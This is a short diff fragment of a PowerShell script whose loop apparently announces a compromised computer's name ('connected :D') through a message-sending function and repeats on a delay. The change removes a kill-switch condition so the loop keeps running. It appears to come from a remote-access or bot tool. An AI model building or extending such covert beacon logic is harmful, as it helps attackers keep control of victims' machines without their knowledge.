@@ -52,7 +52,6 @@ if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mens
    		$i++
 	}
 
-if ($kill -eq "$true" -and $first_connect -gt 5) {break}
 	Start-Sleep -s $delay ;$first_connect++ 
 }
 }
